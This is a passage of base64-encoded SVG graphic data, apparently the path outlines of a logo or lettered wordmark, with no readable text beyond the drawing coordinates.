jkgMi43LTEuM3ptLTYuNyAyMS41eiIvPgoJCQkJPHBhdGggY2xhc3M9InN0MCIgZD0ibTgwLjMgNDguMWMtMiAwLTMuOSAwLjUtNS43IDEuNS0zLjUgMi01LjkgNS44LTYuMyAxMGwtMC4yIDEuNnYwLjggMSAwLjNjMS4yIDI5IDIgNDYuNSAyLjEgNDguNyAwLjUgNi45IDMuOCA5LjkgNi42IDExLjMgMS42IDAuOCAzLjMgMS4yIDUgMS4yIDMuMyAwIDYuNS0xLjUgOC43LTQuMiAyLjUtMyAzLjItNi44IDMtMTYuOC0wLjEtNi4xLTAuMi0xMi43LTAuMi0xOS41IDAtNC4yIDAtNi43LTAuMS04LjUgMC42LTAuOCAxLjMtMS42IDIuMi0yLjMgMC42LTAuNSAxLjQtMC44IDIuNS0xIDAuOC0wLjIgMS42LTAuMyAyLjItMC4zIDAuNCAwIDAuNiAwIDAuOCAwLjEgMC4zIDAuMSAwLjQgMC4xIDAuNSAwLjIgMS45IDEuOCAzLjMgMi45IDQuNiAzLjYgMC4zIDAuMiAwLjggMC41IDEuNyAxLjEgMi41IDEuOCA1LjIgMi43IDcuOCAyLjcgMy41IDAgNi44LTEuNiA5LjEtNC41IDIuMS0yLjcgMy4xLTYuMSAyLjYtOS42LTAuNS0zLjctMi43LTYuOS02LjEtOS0wLjQtMC4yLTEuMi0wLjgtMi43LTItMi43LTIuMi01LjctMy44LTktNC43LTIuNS0wLjctNS40LTEuMS04LjYtMS4zaC0xLjdjLTIuOSAwLTUuOCAwLjQtOC43IDEuMS0wLjkgMC4yLTEuOCAwLjUtMi42IDAuOC0yLjEtMS41LTQuNi0yLjMtNy41LTIuM3oiLz4KCQkJCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Im0xNDUuMyA0MS45Yy0yLjcgMC01LjQgMC45LTguMSAyLjdsLTAuMyAwLjJjLTEuMSAwLjgtMiAxLjgtMi42IDNsLTAuMiAwLjNjLTQuMyA4LjYtNi41IDE0LjEtNy40IDE3LjgtMC43IDMuMi0xLjMgNi42LTEuNyAxMC4xLTAuNCAzLjYtMC41IDYuOS0wLjQgOS44IDAuMiA0LjIgMS41IDguMiA0IDExLjkgMi4yIDMuMyA0LjcgNS45IDcuNiA3LjggMi4yIDEuNSA0LjYgMi43IDYuOSAzLjggMy4xIDEuNCA2LjIgMi4xIDkuMyAyLjFoN2MzLjggMCA2LjYtMC4zIDguOC0wLjggMi41LTAuNiA1LjMtMiA5LTQuMyA0LjQtMi44IDcuNS02LjIgOS4zLTEwLjIgMS4zLTIuOSAyLjMtNiAyLjktOS4xczEtNi44IDEtMTAuOGMwLTQuNi0xLjEtMTAtMy40LTE2LjEtMi44LTcuNy01LjUtMTIuNC0xMC43LTE0LTEuMy0wLjQtMi42LTAuNi00LTAuNi0yLjQgMC00LjggMC42LTcgMS45LTIuMyAxLjMtNC4xIDMuMy01LjEgNS42cy0xLjYgNS45IDAuNCAxMC42YzAuOSAyLjEgMi4xIDQuNiAzLjQgNy4zIDAuNiAxLjMgMSAyLjkgMSA0LjcgMCAyLjYtMC4yIDQuOS0wLjYgNi42LTAuNCAyLTAuOCAyLjctMC44IDIuNyAwIDAuMS0wLjUgMC44LTEuOSAyLjEtMC41IDAuNS0xLjEgMC44LTEuOSAxLTEuNSAwLjQtMi44IDAuNi00IDAuNi0xLjEgMC0yLjItMC4yLTMuMy0wLjUtMC45LTAuMy0xLjctMC43LTIuNC0xLjItMC42LTAuNS0xLTAuOS0xLjEtMS0wLjEtMC4zLTAuMy0xLjQtMC41LTMuNS0wLjItMi4zIDAtNC40IDAuNS02LjMgMC43LTIuNiAxLjYtNS4zIDIuNy04LjEgMS4zLTMuMSAxLjktNC4yIDItNC40IDEuNy0yLjMgMi43LTQuOCAzLTcuMyAwLjQtMy0wLjEtNS44LTEuNS04LjMtMS45LTMuOS01LjctNi4xLTkuOS02LjF6Ii8+CgkJCQkJPHBhdGggY2xhc3M9InN0MCIgZD0ibTIwMi43IDBjLTIuNyAwLTUuMiAwLjktNy4yIDIuNi0zIDIuNi0zLjUgNS43LTMuOSA5LjQtMC4zIDMuOS0wLjUgMTEuMS0wLjYgMjIuNi0wLjIgMTkuNi0wLjQgMjYuNC0wLjYgMjguNy0wLjMgMy43LTAuNSAxMC45LTAuNiAyMS4zLTAuMSAxMC4xLTAuMyAxNy4xLTAuNCAyMC43LTAuMiA0LjctMC4xIDcuNiAwLjQgOS43IDEuNCA3IDYuNyA5LjYgMTAuOCA5LjYgMy4zIDAgNi40LTEuNSA4LjYtNCAwLjYgMC4zIDEuMSAwLjcgMS43IDEgMy4xIDEuNiA2LjEgMi42IDkuMSAyLjggMC43IDAuMSAxLjQgMC4xIDIuMSAwLjEgMS45IDAgNC0wLjIgNi41LTAuNSAyLjgtMC40IDUtMC43IDYuNS0xIDIuOS0wLjUgNS45LTEuOCA5LjUtNC4xIDMuMy0yLjIgNS45LTQuNyA3LjYtNy4ybDMuMS00LjZjMi0zIDMuMS02LjQgMy4zLTEwLjMgMC4xLTIuNSAwLjEtNS4xIDAtNy42LTAuMS0yLjMtMC4zLTQuOC0wLjYtNy41LTAuMy0zLjQtMS4xLTYuNi0yLjItOS4zLTAuOC0xLjktMS42LTQtMi41LTYuMi0xLjUtNC0zLjUtNi45LTYuMS04LjgtMS44LTEuNC0zLjktMi42LTYuMi0zLjYtMS43LTAuNy0zLjctMS41LTYtMi4zLTIuOS0xLTUuNy0xLjUtOC41LTEuNWgtMS40Yy0yLjUgMC4yLTUuNSAwLjctOS4xIDEuNi0wLjYgMC4yLTEuMiAwLjMtMS44IDAuNSAwLTMuNCAwLjEtNy41IDAuMi0xMi44IDAuMy0xOS45IDAuNi0yMy41IDAuNy0yNC4xIDAuNi00LjktMC45LTExLjEtNy0xMy43LTEuOS0xLjEtMy43LTEuNS01LjQtMS41em0xNy4xIDc0LjhjMS4zLTAuMiAyLjUtMC4zIDMuNi0wLjNoNC4zYzAuOCAwLjQgMS43IDAuOSAyLjcgMS4zIDEuNiAxLjQgMi43IDIuOCAzLjEgNC4xIDAuOCAyLjMgMS4yIDQuOSAxLjIgNy44IDAgMy41LTAuMSA1LjgtMC4yIDcuMmwtMi43IDIuMWMtMC4yIDAuMi0wLjkgMC42LTIuNCAxLjItMS43IDAuNi0zLjQgMS4yLTUuMiAxLjYtMC4yIDAuMS0wLjUgMC4xLTAuNyAwLjEtMC4zIDAtMC42IDAtMC45LTAuMS0xLTAuMy0xLjktMC44LTIuOC0xLjQtMC42LTAuNS0xLjYtMS41LTIuOC0zLjQtMS0xLjYtMS43LTMuMi0yLjEtNC42LTAuNC0xLjUtMC41LTMtMC41LTQuNiAwLjEtMS40IDAuNS0zLjEgMS4zLTQuOSAxLjMtMi45IDEuOS0zLjkgMi00LjEgMC40LTAuMiAwLjktMC45IDIuMS0yeiIvPgoJCQkJPHBhdGggY2xhc3M9InN0MCIgZD0ibTMxNC4xIDQ1LjljLTAuNSAwLTEgMC0xLjUgMC4xLTMuOSAwLjUtNy4xIDIuNy05IDYtMC44LTAuMi0xLjYtMC40LTIuNS0wLjctMy42LTAuOS02LjYtMS40LTkuMS0xLjZoLTEuNWMtMi44IDAtNS42IDAuNS04LjUgMS41LTIuMyAwLjgtNC40IDEuNi02IDIuMy0yLjMgMS00LjQgMi4yLTYuMiAzLjYtMi42IDItNC41IDQuOS02LjEgOC44LTAuOSAyLjMtMS43IDQuNC0yLjUgNi4yLTEuMSAyLjctMS44IDUuOS0yLjIgOS4zLTAuMyAyLjctMC41IDUuMi0wLjYgNy41LTAuMSAyLjUtMC4xIDUuMSAwIDcuNiAwLjIgMy45IDEuMyA3LjMgMy4zIDEwLjNsMy4xIDQuNmMxLjcgMi42IDQuMyA1IDcuNiA3LjIgMy41IDIuMyA2LjUgMy43IDkuNSA0LjEgMS42IDAuMyAzLjggMC42IDYuNSAxIDIuNSAwLjQgNC42IDAuNSA2LjUgMC41IDAuNyAwIDEuNCAwIDIuMS0wLjEgMy0wLjIgNi0xLjIgOS4xLTIuOCAwLjYtMC4zIDEuMS0wLjYgMS43LTEgMi4yIDIuNiA1LjIgNCA4LjYgNCA0LjEgMCA5LjQtMi41IDEwLjgtOS41IDAuNC0yLjEgMC41LTUgMC40LTkuNy0wLjEtMy42LTAuMi0xMC40LTAuNC0yMC43LTAuMS0xMC4zLTAuMy0xNy41LTAuNi0yMS4zLTAuNC01LTAuOS04LTEuOS0xMC4zLTEuOS00LjItNi02LjktMTAuNi02Ljl6bS0yNC44IDI4LjhoNC4zYzEuMSAwIDIuNCAwLjEgMy42IDAuMyAxLjIgMS4xIDEuOCAxLjggMiAyIDAuMSAwLjIgMC43IDEuMSAyIDQuMSAwLjggMS44IDEuMyAzLjUgMS4zIDQuOSAwLjEgMS42LTAuMSAzLjEtMC41IDQuNnMtMS4xIDMtMi4xIDQuNmMtMS4yIDEuOS0yLjIgMi45LTIuOCAzLjQtMC44IDAuNy0xLjggMS4xLTIuOCAxLjQtMC4zIDAuMS0wLjYgMC4xLTAuOSAwLjEtMC4yIDAtMC41IDAtMC43LTAuMS0xLjgtMC40LTMuNS0wLjktNS4yLTEuNi0xLjUtMC42LTIuMi0xLTIuNC0xLjJsLTIuNy0yLjFjLTAuMS0xLjQtMC4yLTMuNi0wLjItNy4yIDAtMi45IDAuNC01LjUgMS4yLTcuOCAwLjUtMS4zIDEuNS0yLjcgMy4xLTQuMSAxLjItMC41IDIuMS0wLjkgMi44LTEuM3oiLz4KCQkJCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Im0zNDEuMyA5NC41Yy0wLjkgMC0xLjkgMC4yLTIuOCAwLjVsLTIgMC44Yy02LjUgMi40LTguNyA2LjYtOS40IDkuNy0wLjUgMi4yLTAuNiA0LjQtMC4zIDYuNSAwLjQgMi41IDEuOSA3LjEgOC4yIDkuNyAyLjEgMC45IDQuMiAxLjMgNi4zIDEuMyAxLjUgMCAzLTAuMiA0LjQtMC43IDIuOC0wLjkgNS4yLTIuNSA3LTQuNyAyLjYtMy4xIDMuNS03LjEgMi41LTExLjEtMC44LTMuMi0yLjctNi01LjQtNy45LTAuOS0wLjYtMS43LTEuMi0yLjUtMS42LTAuNC0wLjQtMC44LTAuOC0xLjMtMS4yLTEuNS0wLjgtMy4xLTEuMy00LjctMS4zeiIvPgoJCQkJPHBhdGggY2xhc3M9InN0MCIgZD0ibTM2OCAxOS4zYy0zIDAtNS44IDAuOC04LjQgMi40LTIuNyAxLjctNC43IDMuOS01LjggNi42LTAuOCAxLjgtMS4yIDMuNy0xLjUgNS44LTAuMiAxLjUtMC4yIDIuOS0wLjIgNC4zIDAgMi41IDAuNSA0LjggMS42IDYuOSAwLjYgMS4xIDEuMiAyLjIgMS45IDMuMyAwLjcgMSAxLjYgMi4yIDIuOCAzLjdsMC4yIDAuM2MwLjEgMC4xIDAuMiAwLjMgMC4zIDAuNC0wLjIgMS4xLTAuMyAyLjMtMC4zIDMuNSAwIDIuMSAwLjMgNC4xIDAuOSA2IDIgMjQuMiAzIDM3LjUgMy4yIDM5LjEgMC41IDYuMyA0LjIgOS4zIDYuMyAxMC41IDIgMS4xIDQgMS43IDYuMSAxLjcgMiAwIDQtMC42IDUuOC0xLjYgMS45LTEuMSA1LjEtMy45IDUuNy05LjcgMC4xLTEuMyAwLjMtMi44LTEuNy0yNC44LTEuNy0xOC45LTIuMi0yMi45LTIuNC0yNC4yLTAuMi0xLTAuNC0yLTAuOC0yLjkgMC44LTEuMSAxLjUtMi40IDIuMi0zLjkgMS41LTMuNSAyLjItNi45IDEuOS0xMC4yLTAuMi0zLjItMS4xLTYuMS0yLjUtOC43LTEuOS0zLjQtNC44LTUuOS04LjMtNy4zLTIuNS0wLjgtNC44LTEuMi03LTEuMnoiLz4KCQkJCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Im00MTYgNi40Yy0zLjMgMC02LjQgMS40LTguOSAzLjktMy4yIDMuMi00IDcuMy0zLjggMTguNCAwLjEgMy45IDAuMiA3LjkgMC4zIDExLjktMTEuMSAxLTEyLjMgMS42LTE0IDIuNy00IDIuMy02LjIgNi4xLTYuMiAxMC4zIDAgMi40IDAuOCA0LjcgMi4zIDYuNiAxLjMgMS43IDMuOSAzLjggOC4zIDQuMyAwLjcgMC4xIDEuNCAwLjEgMi4zIDAuMSAxLjcgMCA0LTAuMSA3LjItMC40IDAuMSAzLjkgMC4xIDguOSAwLjIgMTQuOSAwLjMgMTguNCAwLjIgMjQuNSAwLjEgMjYuNC0wLjMgNSAwLjMgOC41IDEuOSAxMS4yIDIuMyA0IDYgNi4yIDEwLjEgNi4yIDMgMCA3LjItMS4yIDEwLjUtNi44IDEuOS0zLjMgMi41LTcuOCAyLjItMTYuNy0wLjItNi4xLTAuMy0xNC45LTAuMi0yNi4xIDAtNC4zIDAuMS03LjkgMC4xLTEwLjZoMWM1LjQgMCA5LjYtMS42IDEyLjMtNC43IDQuNi01LjIgMy41LTExLjMgMC41LTE1LTEuNy0yLTQuOS00LjUtMTAuNC00LjVoLTAuN2MtMC44IDAtMS43IDAuMS0yLjcgMC4xIDAtMC44IDAtMS43LTAuMS0yLjctMC4xLTcuNi0wLjMtMTIuNy0wLjctMTYtMC4yLTEuOC0wLjUtNC0xLjMtNi4yLTEuNS00LTQuNi02LjYtOC41LTcuMS0wLjYtMC4yLTEuMi0wLjItMS44LTAuMnoiLz4KCQkJCTxwYXRoIGNsYXNzPSJzdDEiIGQ9Im01OC4xIDExNi41Yy0wLjkgMC0yLjMtMC40LTMuMy0yLjQtMC40LTAuOC0wLjgtMi41LTAuOS04LjhsLTQuMyA0LjdjLTEuNiAxLjgtMy41IDMuMi01LjYgNC4zcy00LjEgMS44LTYgMS45Yy0xLjggMC4xLTQgMC02LjgtMC40LTIuNy0wLjQtNC44LTAuNy02LjQtMS0xLjgtMC4zLTMuOC0xLjItNi4zLTIuOS0yLjUtMS42LTQuMy0zLjMtNS40LTVsLTMuMS00LjZjLTEuMi0xLjctMS44LTMuOS0yLTYuMy0wLjEtMi4yLTAuMS00LjUgMC02LjdzMC4zLTQuNiAwLjYtNy4yYzAuMy0yLjcgMC44LTUuMSAxLjYtNy4xIDAuOC0xLjkgMS42LTQgMi41LTYuMyAxLTIuNiAyLjItNC40IDMuNS01LjRzMi43LTEuOCA0LjQtMi41YzEuNi0wLjcgMy41LTEuNCA1LjYtMi4xIDIuNC0wLjggNC42LTEuMiA2LjctMSAyIDAuMSA0LjYgMC42IDcuNyAxLjQgMy4yIDAuOCA1LjcgMS43IDcuNiAyLjYgMS4yIDAuNiAyLjQgMS40IDMuMyAyLjMtMC4xLTEuMi0wLjItMi4yLTAuMy0zLjEtMC4xLTEuNiAwLTMuMSAwLjUtNC4zIDAuNi0xLjUgMS44LTIuNSAzLjMtMi43IDEuNy0wLjIgMy4xIDAuNyAzLjkgMi40IDAuNiAxLjMgMSAzLjggMS4zIDcuNiAwLjMgMy42IDAuNSAxMC42IDAuNiAyMC44czAuMyAxNy4yIDAuNCAyMC45YzAuMSAzLjkgMC4xIDYuNC0wLjIgNy44LTAuNSAyLjctMiAzLjEtMi45IDMuMXptLTQwLjYtMzljLTEuMSAzLjEtMS42IDYuNy0xLjYgMTAuNCAwIDMuOSAwLjEgNi45IDAuNCA5IDAuMiAxLjcgMC44IDIuOSAxLjcgMy41IDEuMyAwLjkgMi42IDEuOSAzLjkgMi45IDEuMSAwLjkgMi43IDEuNyA0LjYgMi41IDIgMC43IDQgMS40IDYuMSAxLjkgMS45IDAuNCAzLjggMC40IDUuOC0wLjJzMy44LTEuNSA1LjQtMi44IDMuMi0zLjEgNC42LTUuNCAyLjUtNC42IDMuMS02LjkgMC44LTQuNiAwLjctNy0wLjgtNS0yLTcuN2MtMS41LTMuNS0yLjQtNS0yLjktNS42LTAuNy0wLjktMS43LTItMy4xLTMuMi0xLjItMS4xLTIuNS0xLjctNC0xLjktMS43LTAuMi0zLjQtMC40LTUtMC40aC00LjhjLTEuNSAwLTIuMyAwLjMtMi42IDAuNS0wLjggMC41LTIuMSAxLjItMy45IDItMy4yIDIuNi01LjMgNS41LTYuNCA4LjR6Ii8+CgkJCQk8cGF0aCBjbGFzcz0ic3QxIiBkPSJtODEuOCAxMTYuNWMtMC41IDAtMC45LTAuMS0xLjQtMC4zLTEuMy0wLjYtMi0yLjItMi4yLTQuNy0wLjEtMS45LTAuOC0xNy41LTIuMS00OC41di0xbDAuMi0xLjZjMC4yLTEuNiAxLTMuMSAyLjQtMy44IDAuNi0wLjMgMS4xLTAuNSAxLjctMC41IDEuMiAwIDIuNSAwLjQgMy4xIDEuNSAwLjggMS43IDAuNyA0LjEgMC45IDQuOCAwLjMtMC4zIDAuNi0wLjcgMS0xLjEgMS43LTEuOSA0LTMuMiA2LjktMy45IDIuNy0wLjcgNS40LTAuOSA4LjEtMC44IDIuNiAwLjEgNSAwLjUgNyAxIDIuMiAwLjYgNC4yIDEuNyA1LjkgMy4xIDEuNCAxLjIgMi42IDIuMSAzLjUgMi42IDEuNCAwLjkgMi4yIDIgMi40IDMuNCAwLjIgMS4zLTAuMSAyLjUtMC45IDMuNS0xIDEuMy0yLjEgMS41LTIuOSAxLjUtMSAwLTItMC40LTMuMi0xLjItMC45LTAuNi0xLjYtMS4xLTIuMi0xLjUtMC43LTAuNC0xLjgtMS4zLTMuMy0yLjctMS4yLTEuMS0yLjYtMS44LTQuMy0yLjFzLTMuOC0wLjMtNi4xIDAuMi00LjMgMS4zLTUuOSAyLjYtMyAyLjgtNC4xIDQuNGMtMC44IDEuMy0xLjEgMS45LTEuMyAyLjEgMC4xIDEuMiAwLjIgMy44IDAuMiAxMC41IDAgNi45IDAuMSAxMy42IDAuMiAxOS43IDAuMiA5LjItMC41IDEwLjgtMS4xIDExLjUtMC43IDAuOS0xLjUgMS4zLTIuNSAxLjN6Ii8+CgkJCQk8cGF0aCBjbGFzcz0ic3QxIiBkPSJtMTU5LjUgMTAzLjRoLTdjLTIgMC00LTAuNS02LjEtMS40LTItMC45LTMuOS0xLjktNS43LTMuMS0xLjktMS4zLTMuNy0zLjItNS40LTUuNS0xLjctMi41LTIuNS01LjEtMi42LTcuNy0wLjEtMi41IDAtNS40IDAuNC04LjZzMC45LTYuMyAxLjUtOS4yYzAuNy0zIDIuOS04LjIgNi43LTE2bDAuMi0wLjMgMC4zLTAuMmMxLjMtMC45IDIuNC0xLjMgMy41LTEuMyAxLjMgMCAyLjQgMC43IDMgMS44IDAuNSAxIDAuNyAyLjEgMC42IDMuNC0wLjIgMS4yLTAuNyAyLjUtMS42IDMuNy0wLjUgMC43LTEuNCAyLjItMi45IDYtMS4yIDMuMS0yLjMgNi4yLTMgOS4xLTAuNyAyLjgtMSA1LjgtMC43IDguOSAwLjMgMy45IDAuOSA1LjcgMS40IDYuNSAwLjcgMS4yIDEuOCAyLjUgMy4yIDMuNiAxLjUgMS4yIDMuMiAyLjEgNSAyLjYgMy43IDEuMSA3LjUgMS4xIDExLjcgMCAyLTAuNSAzLjgtMS41IDUuMy0yLjlzMi43LTIuNyAzLjQtMy45IDEuMy0yLjkgMS43LTUuMWMwLjUtMi4zIDAuNy01LjEgMC43LTguMyAwLTMuMS0wLjYtNS45LTEuOC04LjMtMS4zLTIuNi0yLjQtNS0zLjMtNy0xLjctMy45IDAuMy01LjUgMS4yLTYgMS42LTAuOSAzLjMtMS4xIDQuOC0wLjYgMS4zIDAuNCAyLjggMS44IDUuNSA5LjEgMS45IDUuMyAyLjkgOS44IDIuOSAxMy40IDAgMy41LTAuMyA2LjYtMC44IDkuMnMtMS4zIDUuMS0yLjQgNy41Yy0xLjEgMi41LTMuMiA0LjgtNi4zIDYuNy0yLjkgMS45LTUuMSAzLTYuNyAzLjQtMS40IDAuMy0zLjYgMC41LTYuNyAwLjV6Ii8+CgkJCQkJPHBhdGggY2xhc3M9InN0MSIgZD0ibTIwMC42IDExNi40Yy0wLjkgMC0yLjUtMC40LTMtMy4xLTAuMy0xLjQtMC40LTQtMC4yLTcuOCAwLjEtMy43IDAuMy0xMC43IDAuNC0yMC45czAuMy0xNy4yIDAuNi0yMC44YzAuMy0zLjUgMC40LTEzLjQgMC42LTI5LjIgMC4yLTI0LjYgMC45LTI1LjIgMS42LTI1LjkgMC43LTAuNiAyLjEtMS4yIDQuMi0wLjIgMS4zIDAuNiAyLjcgMS45IDIuMyA1LjQtMC4yIDItMC41IDEwLjQtMC44IDI0LjlzLTAuMyAyMy4yLTAuMiAyNS45YzEuMi0xLjMgMi41LTIuMyA0LjItMy4xIDEuOS0wLjkgNC40LTEuOCA3LjYtMi42IDMuMS0wLjggNS43LTEuMiA3LjctMS40IDIuMS0wLjEgNC40IDAuMiA2LjcgMSAyLjIgMC44IDQuMSAxLjUgNS42IDIuMSAxLjcgMC43IDMuMSAxLjUgNC40IDIuNSAxLjQgMS4xIDIuNSAyLjkgMy41IDUuNCAwLjkgMi4zIDEuNyA0LjQgMi41IDYuMyAwLjggMiAxLjQgNC40IDEuNiA3LjEgMC4zIDIuNiAwLjUgNSAwLjYgNy4yczAuMSA0LjUgMCA2LjdjLTAuMSAyLjQtMC44IDQuNi0yIDYuM2wtMy4xIDQuNmMtMS4xIDEuNy0yLjkgMy40LTUuNCA1LTIuNSAxLjctNC42IDIuNi02LjMgMi45LTEuNSAwLjMtMy42IDAuNi02LjQgMXMtNS4xIDAuNS02LjggMC40Yy0xLjktMC4xLTMuOS0wLjgtNi0xLjlzLTMuOS0yLjYtNS42LTQuM2wtNC4zLTQuN2MtMC4xIDYuMy0wLjUgOC0wLjkgOC44LTAuOCAyLTIuMSAyLjQtMy4xIDIuNHptMjIuOC00OS44Yy0xLjYgMC0zLjIgMC4xLTUgMC40LTEuNSAwLjItMi44IDAuOC00IDEuOS0xLjMgMS4yLTIuNCAyLjMtMy4xIDMuMi0wLjUgMC42LTEuNCAyLjEtMi45IDUuNi0xLjIgMi44LTEuOSA1LjQtMiA3LjctMC4xIDIuNCAwLjEgNC44IDAuNyA3IDAuNiAyLjMgMS42IDQuNiAzLjEgNi45IDEuNCAyLjMgMyA0LjEgNC42IDUuNHMzLjUgMi4yIDUuNCAyLjggMy44IDAuNiA1LjggMC4yYzIuMS0wLjUgNC4yLTEuMSA2LjEtMS45IDEuOS0wLjcgMy40LTEuNSA0LjYtMi41IDEuMy0xIDIuNi0yIDMuOS0yLjkgMC45LTAuNiAxLjUtMS44IDEuNy0zLjUgMC4yLTIuMSAwLjQtNS4yIDAuNC05cy0wLjYtNy4zLTEuNi0xMC40Yy0xLTMtMy4yLTUuOC02LjQtOC40LTEuOC0wLjgtMy4xLTEuNC0zLjktMi0wLjQtMC4yLTEuMS0wLjUtMi42LTAuNWgtNC44eiIvPgoJCQkJPHBhdGggY2xhc3M9InN0MSIgZD0ibTMxNi41IDExNi41Yy0wLjkgMC0yLjMtMC40LTMuMy0yLjQtMC40LTAuOC0wLjgtMi41LTAuOS04LjhsLTQuMyA0LjdjLTEuNiAxLjgtMy41IDMuMi01LjYgNC4zcy00LjEgMS44LTYgMS45Yy0xLjggMC4xLTQgMC02LjgtMC40LTIuNy0wLjQtNC44LTAuNy02LjQtMS0xLjgtMC4zLTMuOC0xLjItNi4zLTIuOS0yLjUtMS42LTQuMy0zLjMtNS40LTVsLTMuMS00LjZjLTEuMi0xLjgtMS44LTMuOS0yLTYuMy0wLjEtMi4yLTAuMS00LjUgMC02LjdzMC4zLTQuNiAwLjYtNy4yYzAuMy0yLjcgMC44LTUuMSAxLjYtNy4xIDAuOC0xLjkgMS42LTQgMi41LTYuMyAxLTIuNiAyLjItNC40IDMuNS01LjRzMi43LTEuOCA0LjQtMi41YzEuNi0wLjcgMy41LTEuNCA1LjYtMi4xIDIuNC0wLjggNC42LTEuMiA2LjctMSAyIDAuMSA0LjYgMC42IDcuNyAxLjQgMy4yIDAuOCA1LjcgMS43IDcuNiAyLjYgMS4yIDAuNiAyLjQgMS40IDMuMyAyLjMtMC4xLTEuMi0wLjItMi4yLTAuMy0zLjEtMC4xLTEuNiAwLTMuMSAwLjUtNC4zIDAuNi0xLjUgMS44LTIuNSAzLjMtMi43IDEuNy0wLjIgMy4xIDAuNyAzLjkgMi40IDAuNiAxLjMgMSAzLjggMS4zIDcuNiAwLjMgMy42IDAuNSAxMC42IDAuNiAyMC44IDAuMSAxMC40IDAuMyAxNy4yIDAuNCAyMC45IDAuMSAzLjkgMC4xIDYuNC0wLjIgNy44LTAuNCAyLjctMiAzLjEtMi45IDMuMXptLTQuMy01MC4xem0tMzYuMyAxMS4xYy0xLjEgMy4xLTEuNiA2LjctMS42IDEwLjQgMCAzLjkgMC4xIDYuOSAwLjQgOSAwLjIgMS43IDAuOCAyLjkgMS43IDMuNSAxLjMgMC45IDIuNiAxLjkgMy45IDIuOSAxLjEgMC45IDIuNyAxLjcgNC42IDIuNSAyIDAuNyA0IDEuNCA2LjEgMS45IDEuOSAwLjQgMy44IDAuNCA1LjgtMC4yczMuOC0xLjUgNS40LTIuOCAzLjItMy4xIDQuNi01LjQgMi41LTQuNiAzLjEtNi45IDAuOC00LjYgMC43LTctMC44LTUtMi03LjdjLTEuNS0zLjUtMi40LTUtMi45LTUuNi0wLjctMC45LTEuNy0yLTMuMS0zLjItMS4yLTEuMS0yLjUtMS43LTQtMS45LTEuNy0wLjItMy40LTAuNC01LTAuNGgtNC44Yy0xLjUgMC0yLjMgMC4zLTIuNiAwLjUtMC44IDAuNS0yLjEgMS4yLTMuOSAyLTMuMiAyLjYtNS4zIDUuNS02LjQgOC40eiIvPgoJCQkJPHBhdGggY2xhc3M9InN0MSIgZD0ibTM0MS4zIDExNWMtMSAwLTIuMS0wLjItMy4yLTAuNy0yLTAuOS0zLjItMi0zLjQtMy41LTAuMi0xLjEtMC4xLTIuMyAwLjItMy42IDAuNC0xLjcgMS44LTMgNC40LTRsMi0wLjh2MS4xYzAuNCAwIDAuOCAwLjEgMS4yIDAuMiAwLjcgMC4yIDEuNSAwLjYgMi42IDEuNCAxLjIgMC45IDIgMiAyLjMgMy4zIDAuNCAxLjUgMC4xIDIuOS0wLjkgNC0wLjggMS0yIDEuNy0zLjQgMi4yLTAuNSAwLjMtMS4xIDAuNC0xLjggMC40eiIvPgoJCQkJPHBhdGggY2xhc3M9InN0MSIgZD0ibTM3NSAxMDUuOGMtMC42IDAtMS4zLTAuMi0yLjItMC42LTEuMy0wLjgtMi4xLTIuMi0yLjMtNC4yLTAuMS0xLjUtMS4yLTE0LjktMy4yLTQwLTAuNS0xLjQtMC44LTIuOC0wLjgtNC40IDAtMS44IDAuNC0zLjEgMS4xLTQgMC42LTAuNyAxLjYtMS41IDMuNS0xLjUgMS4xIDAgMi45IDAuNSAzLjQgMy44IDAuMyAxLjcgMSA5LjUgMi4zIDIzLjcgMS43IDE5IDEuOCAyMi40IDEuNyAyMy4zLTAuMiAxLjgtMC44IDMtMS45IDMuNi0wLjMgMC4xLTAuOSAwLjMtMS42IDAuM3ptLTUuOC01Ny4xYy0xLjIgMC0yLjYtMC4zLTQtMC45bC0wLjQtMC4xLTAuMi0wLjNjLTEtMS4zLTEuOC0yLjQtMi40LTMuMi0wLjUtMC44LTEtMS42LTEuNC0yLjUtMC41LTEtMC43LTIuMS0wLjctMy40IDAtMS4xIDAuMS0yLjIgMC4yLTMuNCAwLjEtMS4zIDAuNC0yLjUgMC45LTMuNSAwLjUtMS4yIDEuNC0yLjIgMi43LTMgMi40LTEuNSA1LjEtMS41IDguNC0wLjMgMS44IDAuNiAzLjEgMS44IDQuMSAzLjYgMC45IDEuNiAxLjQgMy40IDEuNSA1LjRzLTAuMyA0LjItMS4zIDYuNWMtMS4xIDIuNS0yLjMgMy45LTMuNyA0LjQtMS4zIDAuNC0yLjUgMC43LTMuNyAwLjd6bS0wLjgtNy40YzAuNyAwLjMgMS4yIDAuMiAxLjcgMCAwIDAgMC4zLTAuMiAwLjgtMS4zIDAuNC0wLjkgMC41LTEuNiAwLjUtMi4zLTAuMS0wLjgtMC4zLTEuNS0wLjYtMi4xLTAuMi0wLjQtMC41LTAuNy0wLjktMC44LTAuOS0wLjQtMS42LTAuNS0yLjItMC4xLTAuMyAwLjItMC40IDAuNC0wLjUgMC42LTAuMSAwLjMtMC4yIDAuNy0wLjIgMS4xdjEuN2MwIDAuNCAwIDAuOCAwLjEgMSAwLjEgMC4zIDAuMiAwLjYgMC40IDAuOSAwLjEgMC4yIDAuMyAwLjYgMC45IDEuM3oiLz4KCQkJCTxwYXRoIGNsYXNzPSJzdDEiIGQ9Im00MTUuOCAxMTVjLTAuOSAwLTIuMS0wLjQtMy4yLTIuMi0wLjctMS4zLTEtMy40LTAuOC02LjggMC4yLTIuOSAwLjEtMTItMC4xLTI3LTAuMi0xMi42LTAuMy0yMC43LTAuMy0yMy4yLTAuNy0wLjEtMi40LTAuMi02LjIgMC4yLTUuNCAwLjYtOC44IDAuNy0xMC4zIDAuNi0zLjEtMC40LTMuNC0yLjItMy40LTMgMC0xIDAuNC0yLjMgMi4yLTMuNCAwLjYtMC40IDEuNy0xIDE4LjMtMi4yLTAuMy02LjUtMC41LTEzLTAuNi0xOS40LTAuMi0xMC4xIDAuNy0xMS44IDEuNS0xMi42IDEuNS0xLjUgMi45LTEuNiAzLjgtMS41IDIuMiAwLjMgMi43IDMuMyAzIDYuMiAwLjMgMy4xIDAuNSA4LjIgMC42IDE1LjQgMC4xIDcuMyAwLjMgOS45IDAuNCAxMC44IDAuNCAwLjEgMS40IDAuMiAzLjUgMC4xIDMtMC4yIDUuNC0wLjMgNy4xLTAuNCAyLjItMC4xIDMuNyAwLjUgNC43IDEuNiAwLjUgMC42IDEuNiAyLjQtMC40IDQuNi0xLjIgMS4zLTMuMiAyLTYuMyAyLTIuNS